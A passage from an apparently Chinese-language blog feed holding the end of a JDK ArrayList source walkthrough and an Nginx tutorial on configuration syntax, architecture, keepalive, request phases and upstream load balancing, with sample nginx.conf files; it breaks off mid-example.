add(e, elementData, size);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">      Inserts the specified element at the specified position in this</span><br><span class="line">      list. Shifts the element currently at that position (if any) and</span><br><span class="line">      any subsequent elements to the right (adds one to their indices).</span><br><span class="line">     </span><br><span class="line">     @param index index at which the specified element is to be inserted</span><br><span class="line">     @param element element to be inserted</span><br><span class="line">     @throws IndexOutOfBoundsException &#123;@inheritDoc&#125;</span><br><span class="line">     将指定元素插入其中的指定位置</span><br><span class="line">    列表。将当前位于该位置(如果有)的元素移动，并</span><br><span class="line">     右边的任何后续元素(将一个元素添加到它们的索引中)。</span><br><span class="line">    @param索引要插入指定元素的索引</span><br><span class="line">    要插入的@param元素</span><br><span class="line">     @throws IndexOutOfBoundsException &#123;@inheritDoc&#125;</span><br><span class="line">     /</span><br><span class="line">    public void add(int index, E element) &#123;</span><br><span class="line">        rangeCheckForAdd(index);</span><br><span class="line">        modCount++;</span><br><span class="line">        final int s;</span><br><span class="line">        Object[] elementData;</span><br><span class="line">        if ((s = size) == (elementData = this.elementData).length)</span><br><span class="line">            elementData = grow();</span><br><span class="line">        System.arraycopy(elementData, index,</span><br><span class="line">                         elementData, index + 1,</span><br><span class="line">                         s - index);</span><br><span class="line">        elementData[index] = element;</span><br><span class="line">        size = s + 1;</span><br><span class="line">    &#125;</span><br></pre>      </td>    </tr>  </table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;源代码阅读：基于JDK12.0，若有不对，请指正。&lt;/p&gt;
    
    </summary>
    
      <category term="源代码" scheme="http://javastar.club/categories/%E6%BA%90%E4%BB%A3%E7%A0%81/"/>
    
    
      <category term="JDK" scheme="http://javastar.club/tags/JDK/"/>
    
  </entry>
  
  <entry>
    <title>nginx核心知识</title>
    <link href="http://javastar.club/archives/9015eb1.html"/>
    <id>http://javastar.club/archives/9015eb1.html</id>
    <published>2019-08-01T06:07:11.000Z</published>
    <updated>2019-08-07T07:14:52.720Z</updated>
    
    <content type="html"><![CDATA[<p>nginx学习入门</p><a id="more"></a><h3 id="Nginx的三个主要应用场景"><a href="#Nginx的三个主要应用场景" class="headerlink" title="Nginx的三个主要应用场景"></a>Nginx的三个主要应用场景</h3><ul>  <li>静态资源服务：通过本地文件系统提供服务</li>  <li>反向代理服务：Nginx的强大性能、缓存、负载均衡</li>  <li>API服务：OpenResty</li></ul><h3 id="Nginx的主要优点"><a href="#Nginx的主要优点" class="headerlink" title="Nginx的主要优点"></a>Nginx的主要优点</h3><ol>  <li>高并发、高性能</li>  <li>可扩展性好</li>  <li>高可靠性</li>  <li>热部署</li>  <li>BSD许可证</li></ol><h3 id="Nginx的组成"><a href="#Nginx的组成" class="headerlink" title="Nginx的组成"></a>Nginx的组成</h3><ol>  <li>Nginx二进制可执行文件：由各模块源码编译出的一个文件</li>  <li>Nginx.conf配置文件：控制Nginx的行为</li>  <li>access.log访问日志：记录每一条http请求信息</li>  <li>error.log错误日志：定位问题</li></ol><h3 id="Nginx配置语法"><a href="#Nginx配置语法" class="headerlink" title="Nginx配置语法"></a>Nginx配置语法</h3><ol>  <li>配置文件由指令和指令块构成</li>  <li>每条指令以；分号结尾，指令与参数间以空格符号分隔。</li>  <li>使用$符号使用变量</li>  <li>使用#符号添加注释</li>  <li>指令块以{}大括号将多条指令组织在一起</li>  <li>include语句允许组合多个配置文件以提高可维护性</li>  <li>部分指令的参数支持正则表达式</li></ol><h3 id="Nginx语法示例"><a href="#Nginx语法示例" class="headerlink" title="Nginx语法示例"></a>Nginx语法示例</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre>      </td>      <td class="code">        <pre><span class="line">http&#123;</span><br><span class="line">include mime.types;</span><br><span class="line">upstream thwp&#123;</span><br><span class="line">server 127.0.0.1:8000;</span><br><span class="line">&#125;</span><br><span class="line">server&#123;</span><br><span class="line">listen 443 http2;</span><br><span class="line">#Nginx配置语法</span><br><span class="line">limit_req_zone $binary_remote_addr Zone=one:10m rate=1r/s;</span><br><span class="line">location ~* \.(gir|jpg|jpeg)$ &#123;</span><br><span class="line">proxy_cache my_cache;</span><br><span class="line">expires 3m;proxy_cache_key $host$uri$is_args$args;</span><br><span class="line">proxy_cache_valid 200 304 302 1d;</span><br><span class="line">proxy_pass http://javastar.club;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="配置参数"><a href="#配置参数" class="headerlink" title="配置参数"></a>配置参数</h3><p><strong>时间的单位</strong></p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>      </td>      <td class="code">        <pre><span class="line">ms:milliseconds</span><br><span class="line">d:days</span><br><span class="line">s:seconds</span><br><span class="line">w:weeks</span><br><span class="line">m:minutes</span><br><span class="line">h:hours</span><br><span class="line">M:months,30days</span><br><span class="line">y:years,365days</span><br></pre>      </td>    </tr>  </table></figure><p><strong>空间的单位</strong></p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">    bytes</span><br><span class="line">k/K:kilobytes</span><br><span class="line">m/M:megabytes</span><br><span class="line">g/G:gigabytes</span><br></pre>      </td>    </tr>  </table></figure><h3 id="Nginx命令行"><a href="#Nginx命令行" class="headerlink" title="Nginx命令行"></a>Nginx命令行</h3><ol>  <li>格式：nginx -s reload</li>  <li>帮助：-? -h</li>  <li>使用指定的配置文件： -c</li>  <li>指定配置指令：-g</li>  <li>指定运行目录：-p</li>  <li>发送信号：-s (立刻停止服务： stop 优雅的停止服务： quit 重载配置文件： reload 重新开始记录日志文件：reopen)</li>  <li>测试配置文件是否有语法错误：-t -T</li>  <li>打印nginx的版本信息、编译信息等：-v -V</li></ol><h3 id="SSL-Secure-Sockets-Layer-TLS-Transport-Layer-Security"><a href="#SSL-Secure-Sockets-Layer-TLS-Transport-Layer-Security" class="headerlink" title="SSL(Secure Sockets Layer) TLS(Transport Layer Security)"></a>SSL(Secure  Sockets Layer) TLS(Transport Layer Security)</h3><p>  <strong>ISO/OSI模型</strong><br>应用层<br>表示层<br>会话层<br>传输层<br>网络层<br>数据链路层<br>物理层<br><strong>TCP/IP模型</strong><br>应用层<br>传输层<br>网络层<br>链路层<br><strong>TLS安全密码套件</strong></p><p>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</p><p>ECDHE:密钥交换算法<br>RSA：身份验证算法<br>AES_128_GCM:对称加密算法、强度、分组模式<br>SHA256:签名hash算法</p><h3 id="PKI公钥基础设施"><a href="#PKI公钥基础设施" class="headerlink" title="PKI公钥基础设施"></a>PKI公钥基础设施</h3><p>证书签名申请(request certificate issuance,CSR)<br>证书类型：<br>域名验证(domain  validated,DV)证书<br>组织验证(organization validated,OV)证书<br>扩展验证(extended  validation,EV)证书<br>证书链</p><h3 id="TLS通讯过程"><a href="#TLS通讯过程" class="headerlink" title="TLS通讯过程"></a>TLS通讯过程</h3><ol>  <li>验证身份</li>  <li>达成安全套件共识</li>  <li>传递密钥</li>  <li>加密通讯</li></ol><h3 id="Nginx简介"><a href="#Nginx简介" class="headerlink" title="Nginx简介"></a>Nginx简介</h3><p>Nginx 是一款轻量级的 Web （HTTP）服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器<br>优势：能支持高达 50,000  个并发连接数 ；支持热部署 ；很高的稳定性（抵御dos攻击）</p><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p> 在 unix 系统中会以 daemon （守护进程）的方式在后台运行，后台进程包含一个 master 进程和多个 worker  进程（多进程的工作方式）<br> 1、多个 worker 进程之间是对等的，他们同等竞争来自客户端的请求，各进程互相之间是独立的。</p><p>2、一个请求，只可能在一个 worker 进程中处理，一个 worker 进程，不可能处理其它进程的请求。</p><p>3、推荐设置 worker 的个数为 cpu 的核数</p><p>4、异步非阻塞 （非阻塞不会让出cpu导致切换浪费）</p><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><p><strong>1、connection</strong></p><p>是对 tcp 连接的封装;</p><p>Nginx 通过设置 worker_connectons 来设置每个worker进程支持的最大连接数;</p><p>Nginx 能建立的最大连接数，应该是worker_connections * worker_processes;对于 HTTP  请求本地资源来说，能够支持的最大并发数量是worker_connections * worker_processes，而如果是 HTTP  作为反向代理来说，最大并发数量应该是worker_connections *  worker_processes/2。因为作为反向代理服务器，每个并发会建立与客户端的连接和与后端服务的连接，会占用两个连接。</p><p><strong>2、request</strong></p><p>Nginx 中指 http 请求;</p><p>web服务器工作流：http 请求是典型的请求-响应类型的的网络协议，而 http  是文本协议，所以我们在分析请求行与请求头，以及输出响应行与响应头，往往是一行一行的进行处理。如果我们自己来写一个 http  服务器，通常在一个连接建立好后，客户端会发送请求过来。然后我们读取一行数据，分析出请求行中包含的 method、uri、http_version  信息。然后再一行一行处理请求头，并根据请求 method  与请求头的信息来决定是否有请求体以及请求体的长度，然后再去读取请求体。得到请求后，我们处理请求产生需要输出的数据，然后再生成响应行，响应头以及响应体。在将响应发送给客户端之后，一个完整的请求就处理完了。</p><p><strong>3、keepalive</strong></p><p>长连接: http 请求是基于 TCP 协议之上的，那么，当客户端在发起请求前，需要先与服务端建立 TCP 连接(三次握手)，当连接断开后（四次挥手）。而  http  请求是请求应答式的，如果我们能知道每个请求头与响应体的长度，那么我们是可以在一个连接上面执行多个请求的，这就是所谓的长连接，但前提条件是我们先得确定请求头与响应体的长度。对于请求来说，如果当前请求需要有body，如  POST 请求，那么 Nginx 就需要客户端在请求头中指定 content-length 来表明 body 的大小，否则返回 400  错误。也就是说，请求体的长度是确定的，那么响应体的长度呢？先来看看 http 协议中关于响应 body 长度的确定：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">对于 http1.0 协议来说，如果响应头中有 content-length 头，则以 content-length 的长度就可以知道 body 的长度了，客户端在接收 body 时，就可以依照这个长度来接收数据，接收完后，就表示这个请求完成了。而如果没有 content-length 头，则客户端会一直接收数据，直到服务端主动断开连接，才表示 body 接收完了。</span><br><span class="line">而对于 http1.1 协议来说，如果响应头中的 Transfer-encoding 为 chunked 传输，则表示 body 是流式输出，body 会被分成多个块，每块的开始会标识出当前块的长度，此时，body 不需要通过长度来指定。如果是非 chunked 传输，而且有 content-length，则按照 content-length 来接收数据。否则，如果是非 chunked，并且没有 content-length，则客户端接收数据，直到服务端主动断开连接。</span><br></pre>      </td>    </tr>  </table></figure><p>从上面，我们可以看到，除了 http1.0 不带 content-length 以及 http1.1 非 chunked 不带  content-length 外，body 的长度是可知的。此时，当服务端在输出完 body  之后，会可以考虑使用长连接。能否使用长连接，也是有条件限制的。如果客户端的请求头中的 connection为close，则表示客户端需要关掉长连接，如果为  keep-alive，则客户端需要打开长连接，如果客户端的请求中没有 connection 这个头，那么根据协议，如果是 http1.0，则默认为  close，如果是 http1.1，则默认为 keep-alive。如果结果为 keepalive，那么，Nginx 在输出完响应体后，会设置当前连接的  keepalive 属性，然后等待客户端下一次请求。当然，Nginx 不可能一直等待下去，如果客户端一直不发数据过来，岂不是一直占用这个连接？所以当  Nginx 设置了 keepalive 等待下一次的请求时，同时也会设置一个最大等待时间，这个时间是通过选项 keepalive_timeout  来配置的，如果配置为 0，则表示关掉 keepalive，此时，http 版本无论是 1.1 还是 1.0，客户端的 connection 不管是  close 还是 keepalive，都会强制为 close。</p><p>如果服务端最后的决定是 keepalive 打开，那么在响应的 http 头里面，也会包含有 connection  头域，其值是”Keep-Alive”，否则就是”Close”。如果 connection 值为 close，那么在 Nginx  响应完数据后，会主动关掉连接。所以，对于请求量比较大的 Nginx 来说，关掉 keepalive 最后会产生比较多的 time-wait 状态的  socket。一般来说，当客户端的一次访问，需要多次访问同一个 server 时，打开 keepalive  的优势非常大，比如图片服务器，通常一个网页会包含很多个图片。打开 keepalive 也会大量减少 time-wait 的数量。</p><p><strong>4、pipe</strong></p><p>http1.1 引入新特性,keepalive 的一种升华，基于长连接的，目的就是利用一个连接做多次请求;</p><p>对 pipeline 来说，客户端不必等到第一个请求处理完后，就可以马上发起第二个请求;</p><p><strong>5、linger_close</strong></p><p>延迟关闭，也就是说，当 Nginx 要关闭连接时，并非立即关闭连接，而是先关闭 tcp 连接的写，再等待一段时间后再关掉连接的读。</p><h3 id="四、配置"><a href="#四、配置" class="headerlink" title="四、配置"></a>四、配置</h3><p><strong>1、nginx.conf</strong></p><p>指令上下文：</p><pre><code>main: Nginx 在运行时与具体业务功能（比如http服务或者email服务代理）无关的一些参数，比如工作进程数，运行的身份等。http: 与提供 http 服务相关的一些配置参数。例如：是否使用 keepalive 啊，是否使用gzip进行压缩等。server: http 服务上支持若干虚拟主机。每个虚拟主机一个对应的 server 配置项，配置项里面包含该虚拟主机相关的配置。在提供 mail 服务的代理时，也可以建立若干 server，每个 server 通过监听的地址来区分。location: http 服务中，某些特定的URL对应的一系列配置项。mail: 实现 email 相关的 SMTP/IMAP/POP3 代理时，共享的一些配置项（因为可能实现多个代理，工作在多个监听地址上）。</code></pre><p>示例：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre>      </td>      <td class="code">        <pre><span class="line">worker_processes 1;      //一般设置为cpu核数</span><br><span class="line"></span><br><span class="line">error_log logs/error.log error;</span><br><span class="line">pid logs/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">　　worker_connections 1024;     //每个worker的最大连接数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">　　include mime.types;</span><br><span class="line">　　default_type application/octet-stream;</span><br><span class="line">　　sendfile on;</span><br><span class="line">　　tcp_nopush on;</span><br><span class="line">　　server_names_hash_bucket_size 128;</span><br><span class="line">　　keepalive_timeout 1800s;      //支持长连接</span><br><span class="line"></span><br><span class="line">　　client_max_body_size 0;</span><br><span class="line"></span><br><span class="line">　　proxy_connect_timeout 5s;</span><br><span class="line">　　proxy_read_timeout 1800s;</span><br><span class="line"></span><br><span class="line">　　proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">　　proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">　　proxy_set_header Host $http_host;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">     upstream web_vmaxfmproxy_pool &#123; server 10.43.136.220:27430; &#125;</span><br><span class="line">     upstream web_vmaxdatacheck_pool &#123; server 10.43.136.220:27340; &#125;</span><br><span class="line"></span><br><span class="line">　　server &#123;</span><br><span class="line">　　　　listen 28888;</span><br><span class="line">           server_name web_web_pool;</span><br><span class="line">　　　　location ~ ^/web/cometd &#123;</span><br><span class="line">                     proxy_pass http://web_web_pool;</span><br><span class="line">                     proxy_http_version 1.1;</span><br><span class="line">                     proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">                     proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">　　　　&#125;</span><br><span class="line"></span><br><span class="line">　　     location / &#123;</span><br><span class="line">　　　　　　if ($uri ~ ^/vmaxfmproxy/)&#123; proxy_pass http://web_vmaxfmproxy_pool; break; &#125;</span><br><span class="line">　　　　　　if ($uri ~ ^/vmaxdatacheck/)&#123; proxy_pass http://web_vmaxdatacheck_pool; break; &#125;</span><br><span class="line">　　　　&#125;</span><br><span class="line"></span><br><span class="line">　　　　location /rdk/service &#123;</span><br><span class="line">　　　　　　proxy_pass http://localhost:5555;</span><br><span class="line">　　　　&#125;</span><br><span class="line">　　　　location ~ /rdk/app/(?&lt;section&gt;.*) &#123;</span><br><span class="line">　　　　　　proxy_pass http://web_rdk_server_pool/rdk_server/app/$section;</span><br><span class="line">　　　　&#125;</span><br><span class="line"></span><br><span class="line">　　　　location /web/res/web-framework/default.html &#123;</span><br><span class="line">　　　　　　rewrite /web/res/web-framework/default.html /rdk/app/portal/web/index.html permanent;</span><br><span class="line">　　　　&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="五、nginx模块"><a href="#五、nginx模块" class="headerlink" title="五、nginx模块"></a>五、nginx模块</h3><pre><code>event module: 搭建了独立于操作系统的事件处理机制的框架，及提供了各具体事件的处理。包括 ngx_events_module， ngx_event_core_module和ngx_epoll_module 等。Nginx 具体使用何种事件处理模块，这依赖于具体的操作系统和编译选项。phase handler: 此类型的模块也被直接称为 handler 模块。主要负责处理客户端请求并产生待响应内容，比如 ngx_http_static_module 模块，负责客户端的静态页面请求处理并将对应的磁盘文件准备为响应内容输出。output filter: 也称为 filter 模块，主要是负责对输出的内容进行处理，可以对输出进行修改。例如，可以实现对输出的所有 html 页面增加预定义的 footbar 一类的工作，或者对输出的图片的 URL 进行替换之类的工作。upstream: upstream 模块实现反向代理的功能，将真正的请求转发到后端服务器上，并从后端服务器上读取响应，发回客户端。upstream 模块是一种特殊的 handler，只不过响应内容不是真正由自己产生的，而是从后端服务器上读取的。load-balancer: 负载均衡模块，实现特定的算法，在众多的后端服务器中，选择一个服务器出来作为某个请求的转发服务器。</code></pre><h3 id="六、nginx-请求过程"><a href="#六、nginx-请求过程" class="headerlink" title="六、nginx 请求过程"></a>六、nginx  请求过程</h3><p>所有实际上的业务处理逻辑都在 worker 进程。worker 进程中有一个函数，执行无限循环，不断处理收到的来自客户端的请求，并进行处理，直到整个  Nginx 服务被停止。</p><p>worker 进程中，ngx_worker_process_cycle()函数就是这个无限循环的处理函数。在这个函数中，一个请求的简单处理流程如下：</p><pre><code>操作系统提供的机制（例如 epoll, kqueue 等）产生相关的事件。接收和处理这些事件，如是接受到数据，则产生更高层的 request 对象。处理 request 的 header 和 body。产生响应，并发送回客户端。完成 request 的处理。重新初始化定时器及其他事件。</code></pre><p>为了让大家更好的了解 Nginx 中请求处理过程，我们以 HTTP Request 为例，来做一下详细地说明。</p><p>从 Nginx 的内部来看，一个 HTTP Request 的处理过程涉及到以下几个阶段。</p><pre><code>初始化 HTTP Request（读取来自客户端的数据，生成 HTTP Request 对象，该对象含有该请求所有的信息）。处理请求头。处理请求体。如果有的话，调用与此请求（URL 或者 Location）关联的 handler。依次调用各 phase handler 进行处理。</code></pre><p>在这里，我们需要了解一下 phase handler 这个概念。phase 字面的意思，就是阶段。所以 phase handlers  也就好理解了，就是包含若干个处理阶段的一些 handler。</p><p>在每一个阶段，包含有若干个 handler，再处理到某个阶段的时候，依次调用该阶段的 handler 对 HTTP Request 进行处理。</p><p>通常情况下，一个 phase handler 对这个 request 进行处理，并产生一些输出。通常 phase handler  是与定义在配置文件中的某个 location 相关联的。</p><p>一个 phase handler 通常执行以下几项任务：</p><pre><code>获取 location 配置。产生适当的响应。发送 response header。发送 response body。</code></pre><p>当 Nginx 读取到一个 HTTP Request 的 header 的时候，Nginx  首先查找与这个请求关联的虚拟主机的配置。如果找到了这个虚拟主机的配置，那么通常情况下，这个 HTTP Request 将会经过以下几个阶段的处理（phase  handlers）：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>      </td>      <td class="code">        <pre><span class="line">NGX_HTTP_POST_READ_PHASE: 读取请求内容阶段</span><br><span class="line">NGX_HTTP_SERVER_REWRITE_PHASE: Server 请求地址重写阶段</span><br><span class="line">NGX_HTTP_FIND_CONFIG_PHASE: 配置查找阶段:</span><br><span class="line">NGX_HTTP_REWRITE_PHASE: Location请求地址重写阶段</span><br><span class="line">NGX_HTTP_POST_REWRITE_PHASE: 请求地址重写提交阶段</span><br><span class="line">NGX_HTTP_PREACCESS_PHASE: 访问权限检查准备阶段</span><br><span class="line">NGX_HTTP_ACCESS_PHASE: 访问权限检查阶段</span><br><span class="line">NGX_HTTP_POST_ACCESS_PHASE: 访问权限检查提交阶段</span><br><span class="line">NGX_HTTP_TRY_FILES_PHASE: 配置项 try_files 处理阶段</span><br><span class="line">NGX_HTTP_CONTENT_PHASE: 内容产生阶段</span><br><span class="line">NGX_HTTP_LOG_PHASE: 日志模块处理阶段</span><br></pre>      </td>    </tr>  </table></figure><p>在内容产生阶段，为了给一个 request 产生正确的响应，Nginx 必须把这个 request 交给一个合适的 content handler  去处理。如果这个 request 对应的 location 在配置文件中被明确指定了一个 content handler，那么Nginx 就可以通过对  location 的匹配，直接找到这个对应的 handler，并把这个 request 交给这个 content handler  去处理。这样的配置指令包括像，perl，flv，proxy_pass，mp4等。</p><p>如果一个 request 对应的 location 并没有直接有配置的 content handler，那么 Nginx 依次尝试:</p><pre><code>如果一个 location 里面有配置 random_index on，那么随机选择一个文件，发送给客户端。如果一个 location 里面有配置 index 指令，那么发送 index 指令指明的文件，给客户端。如果一个 location 里面有配置 autoindex on，那么就发送请求地址对应的服务端路径下的文件列表给客户端。如果这个 request 对应的 location 上有设置 gzip_static on，那么就查找是否有对应的.gz文件存在，有的话，就发送这个给客户端（客户端支持 gzip 的情况下）。请求的 URI 如果对应一个静态文件，static module 就发送静态文件的内容到客户端。</code></pre><p>内容产生阶段完成以后，生成的输出会被传递到 filter 模块去进行处理。filter 模块也是与 location 相关的。所有的 fiter  模块都被组织成一条链。输出会依次穿越所有的 filter，直到有一个 filter 模块的返回值表明已经处理完成。</p><p>这里列举几个常见的 filter 模块，例如：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">server-side includes。</span><br><span class="line">XSLT filtering。</span><br><span class="line">图像缩放之类的。</span><br><span class="line">gzip 压缩。</span><br></pre>      </td>    </tr>  </table></figure><p>在所有的 filter 中，有几个 filter 模块需要关注一下。按照调用的顺序依次说明如下：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">write: 写输出到客户端，实际上是写到连接对应的 socket 上。</span><br><span class="line">postpone: 这个 filter 是负责 subrequest 的，也就是子请求的。</span><br><span class="line">copy: 将一些需要复制的 buf(文件或者内存)重新复制一份然后交给剩余的 body filter 处理。</span><br></pre>      </td>    </tr>  </table></figure><h3 id="七、upstream模块"><a href="#七、upstream模块" class="headerlink" title="七、upstream模块"></a>七、upstream模块</h3><p><strong>1、upstream 模块</strong></p><p>将使 Nginx 跨越单机的限制，完成网络数据的接收、处理和转发。</p><p>数据转发功能，为 Nginx 提供了跨越单机的横向处理能力，使 Nginx  摆脱只能为终端节点提供单一功能的限制，而使它具备了网路应用级别的拆分、封装和整合的战略功能。<br>在云模型大行其道的今天，数据转发是 Nginx  有能力构建一个网络应用的关键组件。</p><p>upstream 属于 handler，只是他不产生自己的内容，而是通过请求后端服务器得到内容，所以才称为  upstream（上游）。<br>请求并取得响应内容的整个过程已经被封装到 Nginx 内部，所以 upstream  模块只需要开发若干回调函数，完成构造请求和解析响应等具体的工作。</p><p><strong>2、负载均衡模块</strong></p><p>负载均衡模块用于从upstream指令定义的后端主机列表中选取一台主机。</p><p>Nginx 先使用负载均衡模块找到一台主机，再使用 upstream 模块实现与这台主机的交互。</p><p>如果需要使用 ip hash 的负载均衡算法：</p><p>示例 :</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre>      </td>      <td class="code">        <pre><span class="line">worker_processes  1;</span><br><span class="line">error_log  logs/error.log  error;</span><br><span class="line">pid        logs/nginx.pid;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;   </span><br><span class="line">    sendfile       on;</span><br><span class="line">    tcp_nopush     on;</span><br><span class="line">    server_names_hash_bucket_size 128;  </span><br><span class="line">    keepalive_timeout  600s;</span><br><span class="line">    proxy_connect_timeout 5s;</span><br><span class="line">    proxy_read_timeout 600s;</span><br><span class="line">    </span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_set_header Host $http_host;</span><br><span class="line"></span><br><span class="line">    upstream lw_web_rdk_server_pool &#123;</span><br><span class="line">         server  10.43.149.160:26180  weight=1;</span><br><span class="line"></span><br><span class="line">         server  10.43.136.220:5812  weight=1;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen  26188;</span><br><span class="line">        server_name localhost;</span><br><span class="line">        location /&#123;</span><br><span class="line">        proxy_pass  http://lw_web_rdk_server_pool;</span><br><span class="line">        proxy_redirect default;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">       listen  26185;</span><br><span class="line">       server_name localhost;</span><br><span class="line">       location /rdk/service &#123;</span><br><span class="line">                            proxy_pass http://localhost:5812;</span><br><span class="line">                    &#125;</span><br><span class="line">       location / &#123;</span><br><span class="line">        root   ../../;</span><br><span class="line">        index  index.html index.htm;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="Nginx源码剖析，本次代码分析主要基于nginx-1-17-2版本"><a href="#Nginx源码剖析，本次代码分析主要基于nginx-1-17-2版本" class="headerlink" title="Nginx源码剖析，本次代码分析主要基于nginx-1.17.2版本"></a>Nginx源码剖析，本次代码分析主要基于nginx-1.17.2版本</h2><p>Nginx的源码主要分布在src/目录下，而src/目录下主要包含三部分比较重要的模块。</p><ol>  <li>    <p>core：包含了Nginx的最基础的库和框架。包括了内存池、链表、hashmap、String等常用的数据结构。</p>  </li>  <li>    <p>      event：事件模块。Nginx自己实现了事件模型。而我们所熟悉的Memcached是使用了Libevent的事件库。自己实现event会性能和效率方便更加高效。    </p>  </li>  <li>    <p>http：实现HTTP的模块。实现了HTTP的具体协议的各种模块，该部分内容量比较大。</p>  </li></ol><h3 id="Nginx架构"><a href="#Nginx架构" class="headerlink" title="Nginx架构"></a>Nginx架构</h3><p>Nginx是一款多进程的软件。Nginx启动后，会产生一个master进程和N个工作进程。其中nginx.conf中可以配置工作进程的个数：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">worker_processes  